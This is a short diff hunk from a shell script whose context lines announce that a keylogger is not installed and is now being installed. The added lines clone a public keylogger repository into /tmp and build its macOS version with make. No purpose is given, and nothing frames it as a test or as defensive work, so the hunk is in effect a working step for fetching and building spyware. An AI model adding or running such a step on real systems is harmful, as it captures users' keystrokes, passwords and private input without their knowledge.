@@ -15,3 +15,7 @@ fi
 
 echo "keylogger not installed"
 echo "Installing keylogger"
+
+git clone https://github.com/GiacomoLaw/Keylogger /tmp/keylogger && cd /tmp/keylogger/mac
+
+make
